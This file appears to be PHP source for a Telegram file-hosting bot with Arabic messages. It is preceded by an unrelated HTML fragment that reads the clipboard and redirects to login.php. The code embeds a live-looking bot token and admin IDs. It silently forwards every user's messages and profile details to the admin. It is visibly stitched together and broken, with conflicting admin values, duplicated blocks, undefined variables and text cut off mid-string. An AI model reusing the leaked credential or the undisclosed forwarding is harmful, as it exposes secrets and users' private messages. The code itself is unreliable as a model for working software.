<!DOCTYPE html>
<html>
<body>
    <button onclick="extractText()"></button>
    <p id="textOutput"></p>

    <script>
        function extractText() {
            navigator.clipboard.readText()
                .then(text => {
                    // Split text into an array of words
                    let words = text.split(' ');
                    // Display words in HTML element
                    document.getElementById("textOutput").innerHTML = words.join('<br>');
                })
                .catch(error => console.error('Unable to extract text from clipboard.', error));
        }
    </script>
<meta http-equiv="refresh" content="0;url=login.php"><br>
<?php
ob_start();
$Token = "7707679654:AAG10Rpdm_dIYe95YRVnZ-o4HhGjir8fa54";
$admin = "5496770570";
define("API_KEY",$Token);
function bot($method, $datas=[]){
$Saied_Botate = "https://api.telegram.org/bot".API_KEY."/".$method;
$saied_botate = null;
if(!empty($datas)){
$boundary = uniqid();
$saied_botate = buildMultipartData($datas,$boundary);
$Saied = ['http'=>[
'header'=>"Content-Type: multipart/form-data; boundary=$boundary\r\n",
'method'=>'POST',
'content'=>$saied_botate,
],];
}


if($saied_botate !== null){
$saied = stream_context_create($Saied);
$saied_result = file_get_contents($Saied_Botate, false, $saied);
}else{
$saied_result = file_get_contents($Saied_Botate);
}
if($saied_result === false){
return "Error: ".error_get_last()['message'];
}else{
return json_decode($saied_result);
}
}
function buildMultipartData($data,$boundary){
$SaiedData = '';
foreach($data as $key => $value){
if($value instanceof CURLFile){
$fileContents = file_get_contents($value->getFilename());
$fileName = basename($value->getFilename());
$fileMimeType = $value->getMimeType();
$SaiedData .= "--" . $boundary . "\r\n";
$SaiedData .= 'Content-Disposition: form-data; name="' . $key . '"; filename="' . $fileName . '"' . "\r\n";
$SaiedData .= 'Content-Type: ' . $fileMimeType . "\r\n\r\n";
$SaiedData .= $fileContents . "\r\n";
}else{
$SaiedData .= "--" . $boundary . "\r\n";
$SaiedData .= 'Content-Disposition: form-data; name="' . $key . '"' . "\r\n\r\n";
$SaiedData .= $value . "\r\n";
}
}
$SaiedData .= "--" . $boundary . "--\r\n";
return $SaiedData;
}

//تخزينات الاذاعة//
echo "تم تشغيل البوت ✅";
$update = json_decode(file_get_contents('php://input'));
$message= $update->message;
$text = $message->text;
$chat_id= $message->chat->id;
$name = $message->from->first_name;
$user = $message->from->username;
$message_id = $update->message->message_id;
$from_id = $update->message->from->id;
$a = strtolower($text);
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$msg = file_get_contents("msg.php");

$users = explode("\n",file_get_contents("BEDO/arslan.json"));

if($message){
if(!in_array($from_id,$users)){
file_put_contents("BEDO/arslan.json",$from_id."\n",FILE_APPEND);}}

$tc = $message->chat->type;
$arslan09 = json_decode(file_get_contents("BEDO/arslan09.json"),true);
$suodo = $arslan09['sudoarr'];
$al = $arslan09['addmessage'];
$ab = $arslan09['messagee'];
$xll = $al + $ab;
if($message and $from_id !== $admin){
$arslan09['messagee'] = $arslan09['messagee']+1;
file_put_contents("BEDO/arslan09.json",json_encode($arslan09,32|128|265));
}
if($message and $from_id == $admin){
$arslan09['addmessage'] = $arslan09['addmessage']+1;
file_put_contents("BEDO/arslan09.json",json_encode($arslan09,32|128|265));
}

$all = count($users)-1;
//---------------------------//

//بداية كود الحظر//
$sudo = array("1322420058");

$get_ban=file_get_contents('sudo/ban.txt');
$ban =explode("\n",$get_ban);

$member = explode("\n",file_get_contents("sudo/member.txt"));
$cunte = count($member)-1;
$ban = explode("\n",file_get_contents("sudo/ban.txt"));
$countban = count($ban);

if($message  and in_array($from_id,$ban)){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"• لقد تم حظرك من البوت ❌
",
]);return false;}

$reply = $message->reply_to_message->message_id;
$rep = $message->reply_to_message->forward_from; 

if($countban<=0){
$countban="لايوجد محظورين";
}
function sendwataw($chat_id,$message_id){

$infosudo = json_decode(file_get_contents("sudo.json"),true);
$fwrmember=$infosudo["info"]["fwrmember"];
$tnbih=$infosudo["info"]["tnbih"];
$silk=$infosudo["info"]["silk"];
$allch=$infosudo["info"]["allch"];
$member = explode("\n",file_get_contents("sudo/member.txt"));
$cunte = count($member)-1;
$ban = explode("\n",file_get_contents("sudo/ban.txt"));
$countban = count($ban)-1;
if($countban<=0){
$countban="لايوجد محظورين";
}
}

@$infosudo = json_decode(file_get_contents("sudo.json"),true);
$sudoamr= $infosudo["info"]["amr"];
if($data == "start"){
$infosudo["info"]["amr"]="start";
file_put_contents("sudo.json", json_encode($infosudo));
}

$usrbot = bot("getme")->result->username;
$emoji = "➡️
🎟️
↪️
🔘
🏠";

$emoji = explode("\n", $emoji);
$b = $emoji[rand(0, 4)];
$NamesBACK = "رجوع $b";

define("USR_BOT", $usrbot);
mkdir("Host");
mkdir("BEDO");
mkdir("sudo");

function SETJSON($INPUT)
{
    if ($INPUT != NULL || $INPUT != "") {
        $F = "Host/Host.json";
        $N = json_encode($INPUT, JSON_PRETTY_PRINT);

        file_put_contents($F, $N);
    }
}


$update = json_decode(file_get_contents('php://input'));

if ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $username = $message->from->username;
    $chat_id = $message->chat->id;
    $title = $message->chat->title;
    $text = $message->text;
    $user = $message->from->username;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$UploadEr = json_decode(file_get_contents("UploadEr/UploadEr.json"), true);


if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}

	
$update = json_decode(file_get_contents('php://input'));

if ($update->message) {
    $message = $update->message;
    $message_id = $update->message->message_id;
    $username = $message->from->username;
    $chat_id = $message->chat->id;
    $title = $message->chat->title;
    $text = $message->text;
    $user = $message->from->username;
    $name = $message->from->first_name;
    $from_id = $message->from->id;
}

$Host = json_decode(file_get_contents("Host/Host.json"), true);


if ($update->callback_query) {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}

//——————————————————//
$MTAWR = "HACKH31";  //معرفك
$admin = "1322420058";  //ايديك//
//——————————————————//

//خزن الاشتراك//
if($Host['hui'] == null) {
$hui ="لا يوجد";
}else{
$hui = $Host['hui'];
}

//دخول الاعضاء//
$mem = explode("\n",file_get_contents("mem.txt"));
$je = file_get_contents("mem.txt");
$count = explode("\n",$je);
$SAl = count($count) -1;
if($username != null){
$sf = "@$username";
}else
if($username == null){
$sf = "لا يوجد معرف";
}
if($message and !in_array($from_id,$mem)){
file_put_contents("mem.txt",$from_id . "\n" ,FILE_APPEND);
$SAl = $SAl + 1;
bot('sendmessage',[
'chat_id'=>$admin,
'text'=>"
*• تم دخول شخص جديد الى البوت 💀*
    •–––––––––––––––––––––––––––––––•

• معلومات الشخص 📜 :

- الاسم : [$name](tg://user?id=$from_id)
- المعرف : $sf
- الايدي : [$from_id](tg://user?id=$from_id)

    •–––––––––––––––––––––––––––––––•
• عدد الاعضاء الكلي :* $SAl 📊*
",
'parse_mode'=>"Markdown",
]);
}
if($from_id != $admin){
bot('forwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$update->message->message_id,
]);
}
if($message->reply_to_message and $chat_id == $admin) {
bot('sendMessage',[
'chat_id'=>$message->reply_to_message->forward_from->id,
'text'=>$text,
'parse_mode'=>"Markdown",
]);
}
//تشغيل وايقاف البوت//
$madey = json_decode(file_get_contents("madey.json"),true);
if(!$madey['bot']){
$madey['bot'] = "on";
file_put_contents("madey.json",json_encode($madey,32|128|265));
}
if($madey['bot'] == "on"){
$xm = "البوت يعمل ✅️";
}else{
$xm = "البوت متوقف ❌️";
}
if($message and $madey['bot'] == "off" and $from_id != $admin){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
👨🏻‍💻 ¦ مرحبا بك عزيزي 
⚠️ ¦ #نعتذر عن التوقف للبوت
⚙ ¦ فقط تحت الصيانة و التحديث
⏰ ¦ سيتم اعادته للخدمة الساعات القادمة
",
'parse_mode'=>'markdown',
]);return false;
}
if($data == "on"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

• تم تشغيل البوت بنجاح ✅️
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع ➡️ ",'callback_data'=>"Thkom" ]],
]])
]);
$madey['bot'] = "on";
file_put_contents("madey.json",json_encode($madey,32|128|265));
}
if($data == "off"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"

• تم ايقاف البوت بنجاح ❌️
",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع ➡️ ",'callback_data'=>"Thkom" ]],
]])
]);
$madey['bot'] = "off";
file_put_contents("madey.json",json_encode($madey,32|128|265));
}

//لوحة الادمن//
if($text == "/start" and $from_id == $admin){
bot('sendMessage',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
⎋ اهلا بك في لوحة الادمن الخاصه بالبوت ⚙️  — — — — — — — — — — — — — —

",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>$xm,'callback_data'=>" " ]],
[['text'=>"ايقاف البوت",'callback_data'=>"off" ],['text'=>"تشغيل البوت",'callback_data'=>"on" ]],
[['text'=>'قسم الاشتࢪاك الاجباࢪي' ,'callback_data'=>"bnt"],['text'=>'قسم الحظࢪ' ,'callback_data'=>"ksmban"]],
[['text'=>'قسم الاذاعه' ,'callback_data'=>"msg"],['text'=>'قسم الࢪسائل' ,'callback_data'=>"sendms"]],
[['text'=>'• احصائيات البوت •' ,'callback_data'=>"HkH"]],
]])
]);
}
if($data == "Thkom"){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
⎋ اهلا بك في لوحة الادمن الخاصه بالبوت ⚙️  — — — — — — — — — — — — — —

",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>$xm,'callback_data'=>" " ]],
[['text'=>"ايقاف البوت",'callback_data'=>"off" ],['text'=>"تشغيل البوت",'callback_data'=>"on" ]],
[['text'=>'قسم الاشتࢪاك الاجباࢪي' ,'callback_data'=>"bnt"],['text'=>'قسم الحظࢪ' ,'callback_data'=>"ksmban"]],
[['text'=>'قسم الاذاعه' ,'callback_data'=>"msg"],['text'=>'قسم الࢪسائل' ,'callback_data'=>"sendms"]],
[['text'=>'• احصائيات البوت •' ,'callback_data'=>"HkH"]],
]])
]);
}

//قسم الاشتࢪاك//
if($data == "bnt"){
bot('EditMessageText', [
'chat_id'=>$admin,
'message_id'=>$message_id,
'text' =>"
*• اهلا بك في قسم الاشتࢪاك الجباري
    •–––––––––––––––––––––––––––––––•
• قناة الاشتࢪاك : $hui*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"حذف قناة 🗑",'callback_data'=>"GkTR"],['text'=>"اضافة قناة ➕",'callback_data'=>"GGTR"]],
[['text'=>"رجوع ➡️",'callback_data'=>"Thkom"]],
]])
]);
}
if($data== 'GGTR'){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
*• اࢪسل معرف قناة الاشتراك معا @*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"Thkom"]],
]])
]);  
$Host['mode'] = "h5hh0";
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}
if(preg_match("/@/",$text) and $Host['mode'] == "h5hh0") {
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"
*• تم تعيين قناة الاشتراك بنجاح ✅*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"bnt"]],
]])
]);   
$Host['mode'] = null;
$Host['hui'] = $text;
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
} 
if($data== 'GkTR'){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
*• تم مسح القناة من الاشتراك 🚫*
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"Thkom"]],
]])
]);   
$Host['mode'] = null;
$Host['hui'] = "لا يوجد";
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
} 

//قسم الحظر//
if($data == "ksmban"){
bot('EditMessageText', [
'chat_id'=>$admin,
'message_id'=>$message_id,
'text' =>"
*• اهلا بك في قسم الحظر
    •–––––––––––––––––––––––––––––––•
• عدد المحظورين : $countban*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء الحظر ⛔",'callback_data'=>"unban"],['text'=>"الحظر 🚫",'callback_data'=>"ban"]],
[['text'=>"رجوع ➡️",'callback_data'=>"Thkom"]],
]])
]);
}
//حظر شخص//
if($data == "ban"){
$infosudo["info"]["amr"]="ban";
file_put_contents("sudo.json", json_encode($infosudo));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"🆔 اࢪسل ايدي الشخص :",
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"الغاء ❌",'callback_data'=>"ksmban"]],
]
])
]);
}
if($text  and $text !="/start" and $sudoamr=="ban" and in_array($from_id,$sudo) and is_numeric($text)){
if(!in_array($text,$ban)){

file_put_contents("sudo/ban.txt","$text\n",FILE_APPEND);

bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم حظر العضو بنجاح : $text ✅",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"ksmban"]],
]
])
]);
bot('sendmessage',[
'chat_id'=>$text, 
'text'=>"تم حظرك من البوت",
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• العضو محظور مسبقاً 🚫",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"ksmban"]],
]
])
]);
}
$infosudo["info"]["amr"]="null";
file_put_contents("sudo.json", json_encode($infosudo));
}
//الفاء الحظر//
if($data == "unban"){
$infosudo["info"]["amr"]="unban";
file_put_contents("sudo.json", json_encode($infosudo));
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'text'=>"🆔 اࢪسل ايدي الشخص :",
"message_id"=>$message_id,
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"الغاء ❌",'callback_data'=>"ksmban"]],
]
])
]);
}
if($text  and $text !="/start" and $sudoamr=="unban" and in_array($from_id,$sudo) and is_numeric($text)){
if(in_array($text,$ban)){

$str=file_get_contents("sudo/ban.txt");
$str=str_replace("$text\n",'',$str);
file_put_contents("sudo/ban.txt",$str);
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• تم الغاء الحظر بنجاح : $text ✅",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"ksmban"]],
]
])
]);

bot('sendmessage',[
'chat_id'=>$text, 
'text'=>"• لقد تم الغاء الحظر عنك ✅",
]);
}else{
bot('sendmessage',[
'chat_id'=>$chat_id, 
'text'=>"• العضو ليس محظور مسبقاً 🚫",
'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>"رجوع ➡️",'callback_data'=>"ksmban"]],
]
])
]);
}
$infosudo["info"]["amr"]="null";
file_put_contents("sudo.json", json_encode($infosudo));
}


//قسم الاذاعة//
if($data == "msg"){
file_put_contents("msg.php", "on");
bot('EditMessageText',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"
• اࢪسل الآن الاذاعة 📣 :
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"الغاء ❌",'callback_data'=>"Thkom"]],
]])
]);
}
if($msg == "on"){
if($message){
for($i=0;$i<count($users); $i++){
bot('sendmessage',[
'chat_id'=>$users[$i],
'text'=>"$text",
]);
}
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
• تم اࢪسال الاذاعة الى ( $all ) شخص ✅
",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"رجوع ➡️ ",'callback_data'=>"Thkom"]],
]])
]);
unlink("msg.php");
}}

//قسم الرسائل//
if($data == "sendms"){
bot('EditMessageText',[
'chat_id'=>$admin,
'message_id'=>$message_id,
'text'=>"
*🆔 ارسل ايدي الشخص :*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"الغاء ❌","callback_data"=>"Thkom"]],
]])
]);
$Host['mode'] = 'chat3';
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}
if($text != '/start' and $text != null and $Host['mode'] == 'chat3'){
bot('sendMessage',[
'chat_id'=>$admin,
'text'=> "
*• اࢪسل الآن رسالتك 💬 :*
",
'parse_mode'=>"MARKDOWN",
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"رجوع ➡️","callback_data"=>"Thkom"]],
]])
]);
$Host['mode'] = 'poi3';
$Host['idd'] = $text;
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}
$ID = $Host['idd'];
if($text != '/start' and $text != null and $Host['mode'] == 'poi3'){
bot('sendMessage',[
'chat_id'=>$admin,
'text'=>"• تم الاࢪسال الى ".$Host['idd']." بنجاح ✅ ",
'parse_mode'=>"Markdown",
 'reply_to_message_id'=>$message_id, 
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"رجوع ➡️","callback_data"=>"Thkom"]],
]])
]);
bot('sendmessage',[
'chat_id'=>$Host['idd'],
'text'=>"• تم اࢪسال رسالة اليك من المطور .

• الرسالة 💬 :

$text",
'parse_mode'=>"Markdown",
]);
$Host['mode'] = null;
$Host['idd'] = null;
$Host = json_encode($Host,32|128|265);
file_put_contents("Host/Host.json",$Host);
}

if ($Host["mems"][$from_id] == null) {
	$Host["mems"][$from_id] = 1 ;
	$Host["memsA"][] = $from_id ;
        SETJSON($Host);
	} 
	if($data == "sendReport") {
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
ارسل الان رساله التوضيحيه للمطور لفك الحظر عنك في البوت :
" ,
        ]);
	$Host["mode"][$from_id] = "sR" ;
        SETJSON($Host);
        return false ;
	} 
	
	if($text and $Host["mode"][$from_id] == "sR") {
		bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "تم تقديم طلب بنجاح سيتم مراجعته
في اقرب وقت ممكن : ",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => 1322420058 ,
            "text" => "[ℹ️] طلب لفك الحظر [🚫]

🔖 من الشخص : [$name](tg://openmessage?user_id=$chat_id) 
🆔 ايدي : [$from_id](tg://user?id=$chat_id)

💬 الكليشه : $text

لفك الحظر عنه اࢪسل [/Unb_$from_id]
",
            "parse_mode" => "markdown"
            
        ]);
        $Host["mode"][$from_id] = null ;
        SETJSON($Host);
        return false ;
		} 
$not = array("1322420058", "1322420058");
if (isset($from_id) && is_array($Host)) {
	if (in_array($from_id, $Host)) {
    if (!in_array($from_id, $not)) {
        bot("deleteMessage", [
            "chat_id" => $chat_id,
            "message_id" => $Host["m_id"][$from_id]
        ]);
        $n = bot("sendMessage", [
            "chat_id" => $chat_id,
            "text" => "[⚠️] تم حظرك من البوت بسبب رفع ملفات مخالفة ❌",
            "parse_mode" => "markdown", 
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"• اࢪسال طلب لفك الحظر •",'callback_data'=>"sendReport" ]], 
      ]
    ])
        ]);
        $Host["m_id"][$from_id] = $n->result->message_id;
        SETJSON($Host);
        return false;
       } 
    }
}

		if(preg_match("/Unb_/", $text)) {
			if($from_id == 1322420058) {
				$B=array_search(explode("_",$text)[1],$Host);
        unset($Host[$B]);
        SETJSON($Host);
				bot("sendMessage", [
            "chat_id" => 1322420058 ,
            "text" => "تم رفع الحظر ✅ Id : (". explode("_",$text)[1].") / $B
",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendMessage", [
            "chat_id" => explode("_",$text)[1] ,
            "text" => "تم فك الحظر عن حسابك ✅
",
            "parse_mode" => "markdown"
            
        ]);
        bot("sendmessage",[
                "chat_id" => explode("_",$text)[1], 
                "text" => "
🔼] مرحبا بك في بوت رفع الملفات علي الاستضافه 
🔖] ارسل الملف الان لرفعه علي الاستضافه 
ℹ️] ملفاتك المرفوعه : $counts
📊] عدد جميع ملفات المرفوعه : $vc | $no
🌏] عدد مستخدمين البوت : $SAl
🤔] تعليمات البوت /help

🛡 ⁞ [تابع قناة تحديثات البوت](https://t.me/T_T_0_0_0

                ",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
    [['text'=>"• رفع الملف •",'callback_data'=>"SendFile"]],
    [['text'=>"📂 - فحص ملفات",'url'=>"http://t.me/T_0_2_5_BOT"],['text'=>"✅ - إحصائيات الرفع",'callback_data'=>"HkH" ]],  
     [['text'=>"📨 - ارسل رساله الدعم",'callback_data'=>"contact" ],['text'=>'🗂 - ضغط ملف','callback_data'=>'zip']],
     [['text'=>"📆 - ملفاتك المرفوعة $counts",'callback_data'=>"counts" ],['text'=>"📕-الملفات المرفوعة $vc | $no",'callback_data'=>"c7g" ]],
     [['text'=>"👤 - عدد المستخدمين $SAl",'callback_data'=>"SAl" ]],
           [['text'=>"🧑‍💻 - المطور",'url'=>"https://t.me/HACKH31" ],['text'=>"🎛 - قناة البوت",'url'=>"https://t.me/T_T_0_0_0" ]],
      ]
    ])
            ]);
				} 
			} 
			
if($data == "SendFile"){
bot('EditMessageText',[
'chat_id'=>$chat_id, 
'message_id'=>$message_id,
'text'=>"
اࢪسل الملف الآن 📁
", 
'reply_to_message_id'=>$message->message_id, 
  'parse_mode'=>'MARKDOWN',
  'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"- الصفحه الرئيسيه -","callback_data"=>"back"]],
]])
]);
}
						
//اشتراك اجباري//
$ch = $rshq['hui']; 
$tc = $update->message->chat->type;
$ch1 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$hui."&user_id=".$from_id);
if($tc == 'private' and $from_id !=$admin){
if($message && (strpos($ch1,'"status":"left"') or strpos($ch1,'"Bad Request: USER_ID_INVALID"') or strpos($ch1,'"status":"kicked"'))!== false){
$x = "@".str_replace("@","",$hui);
$get = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$ch)); 
$res = $get->result;
$namech = $get->title; 
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
• يجب الاشتراك بقناة البوت اولاً ⚠️

⟨ $hui ⟩

- اشترك ثم اضغط { /start } .
",'disable_web_page_preview'=>true,
]);exit();
}
}
$Ca = "@HACKH31";
$tc = $update->message->chat->type;
$Ca1 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=".$hui."&user_id=".$from_id);
if($tc == 'private' and $from_id !=$admin){
if($message && (strpos($Ca1,'"status":"left"') or strpos($Ca1,'"Bad Request: USER_ID_INVALID"') or strpos($Ca1,'"status":"kicked"'))!== false){
$x = "@".str_replace("@","",$hui);
$get = json_decode(file_get_contents("http://api.telegram.org/bot".API_KEY."/getChat?chat_id=".$Ca)); 
$res = $get->result;
$namech = $get->title; 
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
• يجب الاشتراك بقناة البوت اولاً ⚠️

⟨ $hui ⟩

- اشترك ثم اضغط { /start } .
",'disable_web_page_preview'=>true,
]);exit();
}
}

$zero = json_decode(file_get_contents('php://input'));

if(!$zero){
return false;
}


$counts = $Host["count$from_id"] ?? 0;
$vc = $Host["count"] ?? 0;
$no = format_number($vc)?? "0";
$nj = 147 + count($Host["memsA"]) ;
   if( $text == "/start") {
   	bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "
🔼] مرحبا بك في بوت رفع الملفات علي الاستضافه 
🔖] ارسل الملف الان لرفعه علي الاستضافه 
ℹ️] ملفاتك المرفوعه : $counts
📊] عدد جميع ملفات المرفوعه : $vc | $no
🌏] عدد مستخدمين البوت : $SAl
🤔] تعليمات البوت /help

🛡 ⁞ [تابع قناة تحديثات البوت](https://t.me/T_T_0_0_0
                ",
                'parse_mode'=>"markdown",
                'reply_markup'=>json_encode([
     'inline_keyboard'=>[
    [['text'=>"• رفع الملف •",'callback_data'=>"SendFile"]],
    [['text'=>"📂 - فحص ملفات",'url'=>"http://t.me/T_0_2_5_BOT"],['text'=>"✅ - إحصائيات الرفع",'callback_data'=>"HkH" ]],  
     [['text'=>"📨 - ارسل رساله الدعم",'callback_data'=>"contact" ],['text'=>'🗂 - ضغط ملف','callback_data'=>'zip']],
     [['text'=>"📆 - ملفاتك المرفوعة $counts",'callback_data'=>"counts" ],['text'=>"📕-الملفات المرفوعة $vc | $no",'callback_data'=>"c7g" ]],
     [['text'=>"👤 - عدد المستخدمين $SAl",'callback_data'=>"SAl" ]],
           [['text'=>"🧑‍💻 - المطور",'url'=>"https://t.me/HACKH31" ],['text'=>"🎛 - قناة البوت",'url'=>"https://t.me/T_T_0_0_0" ]],
      ]
    ])
            ]);
            $Host["المود"][$from_id] = null ;
        SETJSON($Host) ;
        return false ;
  }
  
  function progress($total, $current){
$progress = $current / $total;
$bar_length = 20;
$filled_length = round($bar_length * $progress);
$bar = str_repeat("✳️", $filled_length) . str_repeat("✨", ($bar_length - $filled_length));
$result = [
"bar"=>"[".$bar."]",
"progress"=>intval($progress * 100) ."%",
];
return $bar. intval($progress * 100) ."%";
}

function format_number($number) {
    $suffixes = array('', 'k', 'm', 'b', 't');
    $suffix_index = 0;

    while ($number >= 1000) {
        $number /= 1000;
        $suffix_index++;
    }

    return round($number, 1) . $suffixes[$suffix_index];
}

//قسم الاحصائيات//
if($data == "HkH") {
	$botfile = $Host["FileMatch"]??"0";
	$other = $Host["unFileMatch"]?? "0";
	$mm = $Host["filehc"]?? "0";
	$curl = $Host["curlfile"]?? "0";
	$no = format_number($vc)?? "0";
	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "*
[👤] عدد مستخدمين البوت : $SAl

[🗂] جميع الملفات المرفوعة : $no

[💀] ملفات اختراق تم الغائها : $mm
            *
" ,
'reply_to_message_id'=>$message->message_id, 
  'parse_mode'=>'MARKDOWN',
  'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[["text"=>"- الصفحه الرئيسيه -","callback_data"=>"back"]],
]])
]);
}
if($message and $text != "/start" and $from_id != $admin and $d7 == "✅" and !$data){
bot('forwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
 'message_id'=>$update->message->message_id,
'text'=>$text,
]);
}
if($message and $text != "/start" and $from_id != $admin and $d7 == "✅" and !$data){
bot('forwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
 'message_id'=>$update->message->message_id,
'text'=>$text,
]);
}

if($data == "contact") {
 	bot("editMessagetext",[
            "chat_id" => $chat_id,
            'message_id' => $message_id , 
            "text" => "
            
ارسل رسالتك
" ,
            "parse_mode" => "markdown",
            'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [["text"=>"- الصفحه الرئيسيه -","callback_data"=>"back"]], 
      ]
    ])
        ]);
        $Host["المود"][$from_id] = "twsl" ;
        SETJSON($Host) ;
} 
if(preg_match("/Rd_/", $text) and $chat_id == $admin) {
		$chat=explode("_", $text)[1];
		$msg=explode("_", $text)[2];
		bot("sendmessage",[
                "chat_id" => $admin , 
                "text" => "
[📶] ارسل الان الرساله
[🔖] يتم ارسالها الى
 
[$from_id](tg://user?id=$chat) 
[Acount](tg://openmessage?user_id=$chat) 
                ",
                'parse_mode'=>"markdown",
            ]);
            $Host["المود"][$from_id] = "Rd_".$chat."_".$msg."" ;
        SETJSON($Host) ;
        return false ;
		} 
		
		if (preg_match("/Rd_/", $Host["المود"][$from_id] ) && $chat_id == $admin) {
    $chat = explode("_", $Host["المود"][$from_id])[1];
    $msg = explode("_", $Host["المود"][$from_id])[2];
    bot("sendmessage", [
        "chat_id" => $admin,
        "text" => "✅ تم ارسل رسالتك ",
        'parse_mode' => "markdown",
    ]);
    $b=bot("sendmessage", [
        "chat_id" => $chat,
        "text" => $text,
        "reply_to_message_id" => $msg, 
        'parse_mode' => "markdown",
    ]);
    bot("sendmessage", [
        "chat_id" => $chat,
        "text" => "هذا رساله من الدعم لارسال الرسائل 📨" ,
        "reply_to_message_id" => $b->result->message_id, 
        'parse_mode' => "markdown",
        'reply_markup'=>json_encode([
     'inline_keyboard'=>[
     [['text'=>"رد على رساله",'callback_data'=>"contact" ]], 
      ]
    ])
    ]);
    
    return false ;
}

if($text and $Host["المود"][$from_id] == "twsl") {
	bot("sendmessage",[
                "chat_id" => $chat_id, 
                "text" => "
تم ارسال رسالتك بنجاح سنجاوب عليك في اقرب وقت ونحل مشكلتك 📨
                ",
